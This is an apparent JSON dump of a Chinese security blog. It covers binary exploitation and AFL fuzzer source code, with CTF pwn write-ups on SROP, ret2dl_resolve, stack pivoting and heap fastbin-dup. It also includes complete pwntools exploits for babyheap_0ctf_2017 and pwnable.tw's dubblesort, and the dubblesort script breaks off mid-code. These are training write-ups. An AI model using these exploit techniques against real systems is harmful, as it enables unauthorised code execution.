&#x27;d&#x27;: p = gdb.debug(elf) else: p = process(elf, timeout = 1) payload1 = b&#x27;/bin/sh\\0&#x27; + cyclic(0x8) payload1+= p64(main_add) p.sendline(payload1) stack_add = u64(p.recv(0x28)[-8::]) - off frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = stack_add frame.rsi = 0 frame.rdx = 0 frame.rsp = stack_add frame.rip = system_add payload = b&#x27;/bin/sh\\0&#x27; + cyclic(0x8) payload+= p64(rtframe) payload+= p64(system_add) payload+= bytes(frame) #p.sendline(&#x27;a&#x27;) #p.recvuntil(&#x27;\\0&#x27;) p.sendline(payload) p.recvuntil(&#x27;/bin/sh&#x27;) p.sendline(&#x27;cat flag&#x27;) print(p.recvline()) p.close() except BaseException as e: p.close() off+=0x8 i+=1 核心模板: 1234567891011while True: try: // p = process() // pass p.sendline(&#x27;cat flag&#x27;) print(p.recvline()) p.close() except BaseException as e: p.close() // pass 采用grep 获取输出包含flag的行就行 0x3.3.ret2dl_resolve() 延迟绑定会使用_dl_resolve()函数 _dl_resolve中 _dl_resolve调用_dl_fixup, _dl_dixup流程： 通过link_map 获得.dynsym、.dynstr、.rel.plt地址 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针 通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针 检查r_info 检查&amp;(Elf64_Sym)-&gt;st_other 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数 综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法) 修改 dynamic 节的内容 修改重定位表项的位置 伪造 linkmap 主要前提要求 无 无 无信息泄漏时需要 libc 适用情况 NO RELRO NO RELRO, Partial RELRO NO RELRO, Partial RELRO 注意点 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 确保重定位位置可写；需要着重伪造重定位表项、符号表； 0x4.Tricks 0x4.1.stack pivoting 栈迁移技巧， 主要针对可溢出字节较少的情况，通过leave此类指令控制rsp 123456;leave 相当于:mov rsp,rbppop rbp;那么考虑将栈帧中rbp地址改为栈迁移目的地址;leave两次之后，就可以将栈转移到目的地址;同时要现在目的地址布置好fake_stack 可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ， 或者.data等段写入，一般要求前面有读取到.data段的函数 不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下: 在第一次read读入后将rbp改为要写入的位置 ret到read 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置 0x4.2.栈对齐 栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。 这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump 可以: 1$ gdb -c core 调试core文件 如果终止指令类似于: 1► 0x7fa8677a3396 movaps xmmword ptr [rsp + 0x40], xmm0 说明是栈对齐的原因，小心调整栈帧就行 0x4.3.Stack smash 对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。 在开启cannary 防护的题目中，检测到栈溢出后，会调用 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag 0x4.4.SROP (1)前置知识: 在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。 那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。 同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。 SROP简要流程: 构造fake_frame 控制当前rsp指向fake_frame底部 sigreturn调用 sigFrame结构如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// x64struct _fpstate&#123; /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd; __uint16_t swd; __uint16_t ftw; __uint16_t fop; __uint64_t rip; __uint64_t rdp; __uint32_t mxcsr; __uint32_t mxcr_mask; struct _fpxreg _st[8]; struct _xmmreg _xmm[16]; __uint32_t padding[24];&#125;;struct sigcontext&#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8];&#125;; (2)pwntools.srop pwntools集成了SROP的模块，可以帮助制作fake_frame: 12345678// 一个简单的例子sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_ret","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"Source-Code-Analysis-of-AFL-[1]-code-instrumentation","slug":"Source-Code-Analysis-of-AFL-[1]-code-instrumentation","date":"2022-06-30T16:00:00.000Z","updated":"2022-07-15T12:35:30.516Z","comments":true,"path":"2022/07/01/Source-Code-Analysis-of-AFL-[1]-code-instrumentation/","link":"","permalink":"http://namonone.com/2022/07/01/Source-Code-Analysis-of-AFL-[1]-code-instrumentation/","excerpt":"","text":"AFL源代码阅读[1]， 主要包含对afl-gcc.c 和afl-as.c的流程分析，也即插桩的过程。而插桩后进程间通信的过程相对复杂，将在后面单独分析。 0x1 文件依赖结构 基本文件结构: afl-as.c、afl-as.h、afl-gcc.c :普通的代码插桩 afl-fuzz.c fuzzer实现代码 核心 llvm_mode llvm模式进行插桩，仅clang适用 qemu_mode qemu模式插桩，针对二进制文件 libdislocator 简单的内存检测工具 libtokencap 语法关键字提取并生成字典文件 afl-analyze.c 对测试样例的字典进行分析 afl_cmin 对fuzzing用到的语料库进行精简操作 afl_tmin.c 对fuzzing中用到的测试用例进行最小化操作 afl-gotcpu.c 统计cpu占用率 afl-plot 绘制报告图标 afl-showmap.c 打印目标程序fuzz后的tuple信息 afl-whatsup 并行fuzz结果统计 alloc-inl.h 定义带检测功能的内存分配和释放操作 Hash.h hash函数的实现和定义 test-instr.c 测试的目标程序 dos 相关说明文档 experimental 一些新特性的试验研究 0x2 基本模块分析 (1)代码插桩 基本流程: afl-gcc --&gt; afl-as afl-gcc.c 0x1.基础变量 name meaning static u8* as_path Path to the AFL ‘as’ wrapper static u8** cc_params Parameters passed to the real CC static u32 cc_par_cnt = 1 Param count, including argv0 static u8 be_quiet Quiet mode static u8 clang_mode Invoked as afl-clang? 0x2.main函数核心流程 a.检查是否是静默模式 12345if (isatty(2) &amp;&amp; !getenv(&quot;AFL_QUIET&quot;)) &#123;SAYF(cCYA &quot;afl-cc &quot; cBRI VERSION cRST &quot; by &lt;lcamtuf@google.com&gt;\\n&quot;);&#125; else be_quiet = 1; b. 检查参数是否完备 1234567891011121314151617if (argc &lt; 2) &#123;SAYF(&quot;\\n&quot; &quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n&quot; &quot;for gcc or clang, letting you recompile third-party code with the required\\n&quot; &quot;runtime instrumentation. A common use pattern would be one of the following:\\n\\n&quot; &quot; CC=%s/afl-gcc ./configure\\n&quot; &quot; CXX=%s/afl-g++ ./configure\\n\\n&quot; &quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n&quot; &quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n&quot;, BIN_PATH, BIN_PATH);exit(1);&#125; c. 找到as路径 1find_as(argv[0]); d. 对于参数进行编辑 1edit_params(argc, argv); e. 调用 1execvp(cc_params[0], (char**)cc_params); 0x3.edit_params() edit_params()被调用于编辑各种参数. 最后传递给真正的编译器(gcc / clang)，对于as的路径进行处理，使之调用到as的封装, afl-as。 //主要是一些细节方面的，之后遇到了再来仔细查看 0x4. find_as() 通过环境变量AFL_PATH找到封装的as的路径 //同样主要是细节方面 afl-as.c 0x1. 基础变量 NAME MEANING static u8** as_params Parameters passed to the real ‘as’ static u8* input_file Originally specified input file static u8* modified_file Instrumented file for the real ‘as’ static u32 inst_ratio = 100 Instrumentation probability (%) 0x2. main函数主要逻辑 a. 同上，对各种模式的判断(这里和上面都对于APPLE都有不同，因为没接触过apple，暂且记下) 1234567clang_mode = !!getenv(CLANG_ENV_VAR);if (isatty(2) &amp;&amp; !getenv(&quot;AFL_QUIET&quot;)) &#123;SAYF(cCYA &quot;afl-as &quot; cBRI VERSION cRST &quot; by &lt;lcamtuf@google.com&gt;\\n&quot;);&#125; else be_quiet = 1; b. 获取随机数种子 12345gettimeofday(&amp;tv, &amp;tz);rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();srandom(rand_seed); c. 编辑参数 1edit_params(argc, argv); d. 根据各种环境变量进行相关配置 123456789101112131415161718192021 if (inst_ratio_str) &#123; if (sscanf(inst_ratio_str, &quot;%u&quot;, &amp;inst_ratio) != 1 || inst_ratio &gt; 100) FATAL(&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;); &#125;// 代码插桩率的设置 if (getenv(AS_LOOP_ENV_VAR)) FATAL(&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;); setenv(AS_LOOP_ENV_VAR, &quot;1&quot;, 1); /* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip ASAN-specific branches. But we can probabilistically compensate for that... */ if (getenv(&quot;AFL_USE_ASAN&quot;) || getenv(&quot;AFL_USE_MSAN&quot;)) &#123; sanitizer = 1; inst_ratio /= 3; &#125; e. 代码插桩 1if (!just_version) add_instrumentation(); f. 调用as 1234567891011121314if (!(pid = fork())) &#123; execvp(as_params[0], (char**)as_params); FATAL(&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;, as_params[0]);&#125;if (pid &lt; 0) PFATAL(&quot;fork() failed&quot;);if (waitpid(pid, &amp;status, 0) &lt;= 0) PFATAL(&quot;waitpid() failed&quot;);if (!getenv(&quot;AFL_KEEP_ASSEMBLY&quot;)) unlink(modified_file);exit(WEXITSTATUS(status)); 0x3. add_instrumentation()代码插桩 a. 主要流程 a-1. 打开输入文件和更改后的输出文件 1234567891011121314if (input_file) &#123; inf = fopen(input_file, &quot;r&quot;); if (!inf) PFATAL(&quot;Unable to read &#x27;%s&#x27;&quot;, input_file);&#125; else inf = stdin;outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, 0600);if (outfd &lt; 0) PFATAL(&quot;Unable to write to &#x27;%s&#x27;&quot;, modified_file);outf = fdopen(outfd, &quot;w&quot;);if (!outf) PFATAL(&quot;fdopen() failed&quot;); a-2. 读取每一行到line数组 123456789101112131415161718 while (fgets(line, MAX_LINE, inf)) &#123;//这个括号匹配到最后 /* In some cases, we want to defer writing the instrumentation trampoline until after all the labels, macros, comments, etc. If we&#x27;re in this mode, and if the line starts with a tab followed by a character, dump the trampoline now. */ if (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; instrument_next &amp;&amp; line[0] == &#x27;\\t&#x27; &amp;&amp; isalpha(line[1])) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));// 这里是defered mode插桩执行语句 instrument_next = 0; ins_lines++; &#125; fputs(line, outf); a-3. 对于插桩的核心处理，定位有跳转语句， 设置flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173 if (pass_thru) continue; /* All right, this is where the actual fun begins. For one, we only want to instrument the .text section. So, let&#x27;s keep track of that in processed files - and let&#x27;s set instr_ok accordingly. */ if (line[0] == &#x27;\\t&#x27; &amp;&amp; line[1] == &#x27;.&#x27;) &#123; /* OpenBSD puts jump tables directly inline with the code, which is a bit annoying. They use a specific format of p2align directives around them, so we use that as a signal. */// 匹配文件中声明的段 if (!clang_mode &amp;&amp; instr_ok &amp;&amp; !strncmp(line + 2, &quot;p2align &quot;, 8) &amp;&amp; isdigit(line[10]) &amp;&amp; line[11] == &#x27;\\n&#x27;) skip_next_label = 1; if (!strncmp(line + 2, &quot;text\\n&quot;, 5) || !strncmp(line + 2, &quot;section\\t.text&quot;, 13) || !strncmp(line + 2, &quot;section\\t__TEXT,__text&quot;, 21) || !strncmp(line + 2, &quot;section __TEXT,__text&quot;, 21)) &#123; instr_ok = 1; continue; // 尝试匹配.text，匹配成功设置标志位为1(即可以插桩) // 进入下一次迭代 &#125; if (!strncmp(line + 2, &quot;section\\t&quot;, 8) || !strncmp(line + 2, &quot;section &quot;, 8) || !strncmp(line + 2, &quot;bss\\n&quot;, 4) || !strncmp(line + 2, &quot;data\\n&quot;, 5)) &#123; instr_ok = 0; continue; &#125; &#125; /* Detect off-flavor assembly (rare, happens in gdb). When this is encountered, we set skip_csect until the opposite directive is seen, and we do not instrument. */ if (strstr(line, &quot;.code&quot;)) &#123; if (strstr(line, &quot;.code32&quot;)) skip_csect = use_64bit; if (strstr(line, &quot;.code64&quot;)) skip_csect = !use_64bit; &#125; /* Detect syntax changes, as could happen with hand-written assembly. Skip Intel blocks, resume instrumentation when back to AT&amp;T. */ if (strstr(line, &quot;.intel_syntax&quot;)) skip_intel = 1; if (strstr(line, &quot;.att_syntax&quot;)) skip_intel = 0; /* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */ if (line[0] == &#x27;#&#x27; || line[1] == &#x27;#&#x27;) &#123; if (strstr(line, &quot;#APP&quot;)) skip_app = 1; if (strstr(line, &quot;#NO_APP&quot;)) skip_app = 0; &#125; /* If we&#x27;re in the right mood for instrumenting, check for function names or conditional labels. This is a bit messy, but in essence, we want to catch: ^main: - function entry point (always instrumented) ^.L0: - GCC branch label ^.LBB0_0: - clang branch label (but only in clang mode) ^\\tjnz foo - conditional branches ...but not: ^# BB#0: - clang comments ^ # BB#0: - ditto ^.Ltmp0: - clang non-branch labels ^.LC0 - GCC non-branch labels ^.LBB0_0: - ditto (when in GCC mode) ^\\tjmp foo - non-conditional jumps Additionally, clang and GCC on MacOS X follow a different convention with no leading dots on labels, hence the weird maze of #ifdefs later on. */ if (skip_intel || skip_app || skip_csect || !instr_ok || line[0] == &#x27;#&#x27; || line[0] == &#x27; &#x27;) continue; /* Conditional branch instruction (jnz, etc). We append the instrumentation right after the branch (to instrument the not-taken path) and at the branch destination label (handled later on). */ if (line[0] == &#x27;\\t&#x27;) &#123; if (line[1] == &#x27;j&#x27; &amp;&amp; line[2] != &#x27;m&#x27; &amp;&amp; R(100) &lt; inst_ratio) &#123; fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE)); ins_lines++; &#125;// 捕捉跳转标志，调用随机数函数，选择是否进行插桩 continue; &#125; /* Label of some sort. This may be a branch destination, but we need to tread carefully and account for several different formatting conventions. */#ifdef __APPLE__ /* Apple: L&lt;whatever&gt;&lt;digit&gt;: */ if ((colon_pos = strstr(line, &quot;:&quot;))) &#123; if (line[0] == &#x27;L&#x27; &amp;&amp; isdigit(*(colon_pos - 1))) &#123;#else /* Everybody else: .L&lt;whatever&gt;: */ if (strstr(line, &quot;:&quot;)) &#123; if (line[0] == &#x27;.&#x27;) &#123;#endif /* __APPLE__ */ /* .L0: or LBB0_0: style jump destination */#ifdef __APPLE__ /* Apple: L&lt;num&gt; / LBB&lt;num&gt; */ if ((isdigit(line[1]) || (clang_mode &amp;&amp; !strncmp(line, &quot;LBB&quot;, 3))) &amp;&amp; R(100) &lt; inst_ratio) &#123;#else /* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */ if ((isdigit(line[2]) || (clang_mode &amp;&amp; !strncmp(line + 1, &quot;LBB&quot;, 3))) &amp;&amp; R(100) &lt; inst_ratio) &#123;#endif /* __APPLE__ */ /* An optimization is possible here by adding the code only if the label is mentioned in the code in contexts other than call / jmp. That said, this complicates the code by requiring two-pass processing (messy with stdin), and results in a speed gain typically under 10%, because compilers are generally pretty good about not generating spurious intra-function jumps. We use deferred output chiefly to avoid disrupting .Lfunc_begin0-style exception handling calculations (a problem on MacOS X). */ if (!skip_next_label) instrument_next = 1; else skip_next_label = 0; &#125; &#125; else &#123; /* Function label (always instrumented, deferred mode). */ instrument_next = 1; &#125; &#125; &#125; b. trampoline插桩代码 这些部分的声明在afl-as.h b-1 .bss段变量 __afl_area_ptr：共享内存地址； __afl_prev_loc：上一个插桩位置（id为R(100)随机数的值）； __afl_fork_pid：由fork产生的子进程的pid； __afl_temp：缓冲区； __afl_setup_failure：标志位，如果置位则直接退出； __afl_global_area_ptr：全局指针。 b-1.trampoline_fmt_64/32 1234567891011121314151617181920212223242526272829303132333435363738394041424344static const u8* trampoline_fmt_32 = &quot;\\n&quot; &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leal -16(%%esp), %%esp\\n&quot; &quot;movl %%edi, 0(%%esp)\\n&quot; &quot;movl %%edx, 4(%%esp)\\n&quot; &quot;movl %%ecx, 8(%%esp)\\n&quot; &quot;movl %%eax, 12(%%esp)\\n&quot; &quot;movl $0x%08x, %%ecx\\n&quot; //想ecx存入随机桩代码 &quot;call __afl_maybe_log\\n&quot; //调用__afl_maybe_log &quot;movl 12(%%esp), %%eax\\n&quot; &quot;movl 8(%%esp), %%ecx\\n&quot; &quot;movl 4(%%esp), %%edx\\n&quot; &quot;movl 0(%%esp), %%edi\\n&quot; &quot;leal 16(%%esp), %%esp\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;;static const u8* trampoline_fmt_64 = &quot;\\n&quot; &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\\n&quot; &quot;\\n&quot; &quot;.align 4\\n&quot; &quot;\\n&quot; &quot;leaq -(128+24)(%%rsp), %%rsp\\n&quot; &quot;movq %%rdx, 0(%%rsp)\\n&quot; &quot;movq %%rcx, 8(%%rsp)\\n&quot; &quot;movq %%rax, 16(%%rsp)\\n&quot; &quot;movq $0x%08x, %%rcx\\n&quot; &quot;call __afl_maybe_log\\n&quot; &quot;movq 16(%%rsp), %%rax\\n&quot; &quot;movq 8(%%rsp), %%rcx\\n&quot; &quot;movq 0(%%rsp), %%rdx\\n&quot; &quot;leaq (128+24)(%%rsp), %%rsp\\n&quot; &quot;\\n&quot; &quot;/* --- END --- */\\n&quot; &quot;\\n&quot;; 主要功能: 保存 rdx、 rcx 、rax 寄存器 将 rcx 的值设置为 fprintf() 函数将要打印的变量内容 调用 __afl_maybe_log 函数 恢复寄存器 b-2. __afl_maybe_log 1234567891011&quot;__afl_maybe_log:\\n&quot;&quot;\\n&quot;&quot; lahf\\n&quot; // 对于标志位的处理&quot; seto %al\\n&quot; &quot;\\n&quot;&quot; /* Check if SHM region is already mapped. */\\n&quot;&quot;\\n&quot;&quot; movl __afl_area_ptr, %edx\\n&quot;&quot; testl %edx, %edx\\n&quot; //判断__afl_area_ptr是否为NULL&quot; je __afl_setup\\n&quot; //为NULL则跳转设置&quot;\\n&quot;","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/categories/Fuzz/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"Fuzz","slug":"Fuzz","permalink":"http://namonone.com/tags/Fuzz/"}]},{"title":"Basic-Heap-Exploitation","slug":"Basic-Heap-Exploitation","date":"2022-05-23T16:00:00.000Z","updated":"2022-07-12T12:02:34.546Z","comments":true,"path":"2022/05/24/Basic-Heap-Exploitation/","link":"","permalink":"http://namonone.com/2022/05/24/Basic-Heap-Exploitation/","excerpt":"","text":"The Basic of Heap Exploitation 基础堆漏洞利用: 主要知识点： fastbin_dup fake_chunk 劫持__malloc_hook babyheap_0ctf_2017 0x1 checksec 123456[*] Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 保护全开，堆题日常操作 0x2 Analysis 漏洞点： 123456789101112131415161718192021222324252627__int64 __fastcall sub_E7F(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf(&quot;Index: &quot;); result = sub_138C(); v2 = result; if ( (int)result &gt;= 0 &amp;&amp; (int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf(&quot;Size: &quot;); //重新读取了一个size result = sub_138C(); v3 = result; if ( (int)result &gt; 0 ) &#123; printf(&quot;Content: &quot;); return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125; 在fill的实现函数中，填充的字符size是重新输入的，所以这个地方可以进行溢出 0x3 Process 泄漏libc_base 劫持__malloc_hooc(利用偏移) getshell 0x4 Some Questions 利用偏移制造fake_chunk时,算错 泄漏的地址和__malloc_hook相对于libc_base的偏移都可以通过本地调试获取 0x4 exp 这个题是参考《CTF竞赛权威指南》进行的一个复现: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from pwn import*p = process(&#x27;./babyheap&#x27;)context.log_level = &#x27;debug&#x27;def alloc(size): p.sendlineafter(&#x27;Command: &#x27;,&#x27;1&#x27;) p.sendlineafter(&#x27;Size: &#x27;,str(size))def fill(idx,payload): p.sendlineafter(&#x27;Command: &#x27;,&#x27;2&#x27;) p.sendlineafter(&#x27;Index: &#x27;,str(idx)) p.sendlineafter(&#x27;Size: &#x27;,str(len(payload))) p.sendafter(&#x27;Content: &#x27;,payload)def free(idx): p.sendlineafter(&#x27;Command: &#x27;,&#x27;3&#x27;) p.sendlineafter(&#x27;Index: &#x27;,str(idx))def dump(idx): p.sendlineafter(&#x27;Command: &#x27;,&#x27;4&#x27;) p.sendlineafter(&#x27;Index: &#x27;,str(idx)) p.recvuntil(&#x27;Content: \\n&#x27;) return p.recvline()def fastbin_dup(): alloc(0x10) alloc(0x10) alloc(0x10) alloc(0x10) alloc(0x80) free(1) free(2) payload = cyclic(0x10) payload+= p64(0) + p64(0x21) payload+= p64(0) + cyclic(0x8) payload+= p64(0) + p64(0x21) payload+= p8(0x80) fill(0,payload) //将2号chunk的fd指针改成最后一个大小0x80的4号chunk //利用第一个chunk偏移为0的特点在没有泄漏时实现(在实现了tcache机制的libc版本有所不同，系统会先分配一段空间给tcache使用) payload = cyclic(0x10) payload+= p64(0) + p64(0x21) fill(3,payload) //更改4号chunk的size区，使得其能绕过检查 alloc(0x10) alloc(0x10) //在原4号chunk位置再分配def leak_libc(): global libc_base,malloc_hook payload = cyclic(0x10) payload+= p64(0) + p64(0x91) fill(3,payload) //4号chunksize改回来 alloc(0x80) free(4) leak_addr = u64(dump(2)[:8]) //释放后来到unsort_bin,fd和bk指向libc地址 libc_base = leak_addr - 0x3c3b78 malloc_hook = libc_base + 0x3c3b10 log.info(&#x27;leak add: 0x%x&#x27; % leak_addr) log.info(&#x27;libc base: 0x%x&#x27; % libc_base) log.info(&#x27;__malloc_hook add: 0x%x&#x27; % malloc_hook)def pwn(): alloc(0x60) free(4) fill(2,p64(malloc_hook - 0x28 + 0x5)) //利用偏移伪造fake_chunk alloc(0x60) alloc(0x60) //分配到fake_chunk(malloc_hook 附近) one_gadget = libc_base + 0x4525a fill(6,p8(0)*0x13 + p64(one_gadget)) //将one_gadget写入hook alloc(1) p.interactive()if __name__==&#x27;__main__&#x27;: fastbin_dup() leak_libc() pwn() 0x6 New Skills 利用偏移制造fake_chunk: 一般libc地址最高位为7f，符合fast_bin对size的检查 所以可以通过偏移，将此字节移动到size位实现 利用unsort_bin泄漏libc地址 当unsort_bin只有一个chunk时，其fd和bk都指向libc的地址，所以可以通过此，泄漏libc地址 一般需要能够在释放后仍然能够控制或读取此chunk 直接通过堆溢出制造实现UAF 核心：在没有tcache机制的的libc下，chunk固定从一个内存页面的开始部分进行分配，所以，对于分配的chunk的地址最后一个字节，是可以推算出来的","categories":[{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://namonone.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://namonone.com/tags/CTF/"}]},{"title":"Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]","slug":"Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]","date":"2022-04-24T16:00:00.000Z","updated":"2022-07-12T12:04:37.400Z","comments":true,"path":"2022/04/25/Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]/","link":"","permalink":"http://namonone.com/2022/04/25/Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]/","excerpt":"","text":"Libc leak and Bypass the canary-pwnable[dobblesort] 0x1 checksec ![checksec](2022-4-25-dobblesort/图像 1.png) Full protection. 0x2 Analysis 查看这个程序， 12345678910111213141516171819202122232425262728293031323334353637383940414243int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int *v4; // edi unsigned int i; // esi unsigned int j; // esi int result; // eax unsigned int v8; // [esp+18h] [ebp-74h] BYREF unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF char buf[64]; // [esp+3Ch] [ebp-50h] BYREF unsigned int v11; // [esp+7Ch] [ebp-10h] v11 = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, &quot;What your name :&quot;); read(0, buf, 0x40u); __printf_chk(1, &quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;v8); v3 = v8; if ( v8 ) &#123; v4 = v9; for ( i = 0; i &lt; v8; ++i ) &#123; __printf_chk(1, &quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, v4); v3 = v8; ++v4; &#125; &#125; sort(v9, v3); puts(&quot;Result :&quot;); if ( v8 ) &#123; for ( j = 0; j &lt; v8; ++j ) __printf_chk(1, &quot;%u &quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v11 ) sub_BA0(); return result;&#125; 对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点 同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc. 进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露 0x3 Process 读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址 读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置 在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过 在栈上布置libc中system以及/bin/sh的地址 0x4 Some questions 在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间 一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。 在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了 解决： 多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。 那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址 思考： 对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着 以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗? 0x5 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*#p = gdb.debug(&#x27;./dubblesort&#x27;,&#x27;b main&#x27;)#p = process(&#x27;./dubblesort&#x27;)p = remote(&#x27;chall.pwnable.tw&#x27;,10101)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &#x27;debug&#x27;#elf = ELF(&#x27;/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so&#x27;)ret_add = 0x177dcelf = ELF(&#x27;./libc_32.so.6&#x27;)def putNum(i): p.recvuntil(&#x27; : &#x27;) p.sendline(str(i))name = cyclic(27)p.recvuntil(&#x27;name :&#x27;)p.sendline(name)libc_base = u32(p.recv(32+6)[-4:])print(&#x27;%x&#x27; % libc_base)libc_base = (((libc_base&gt;&gt;12)-0x1Ae)&lt;&lt;12)print(&#x27;%x&#x27; % 